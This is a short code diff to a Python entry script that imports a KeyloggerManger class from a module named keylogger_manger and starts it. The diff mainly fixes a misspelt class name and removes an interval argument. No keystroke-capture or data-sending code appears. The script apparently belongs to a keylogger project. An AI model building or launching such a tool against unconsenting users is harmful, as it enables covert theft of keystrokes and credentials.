@@ -1,5 +1,8 @@
-from keylogger_manger import KeyloggerManager
+from keylogger_manger import KeyloggerManger
 
 if __name__ == "__main__":
-    manager = KeyloggerManager(interval=1)
+    manager = KeyloggerManger()
     manager.start()
+
+
+
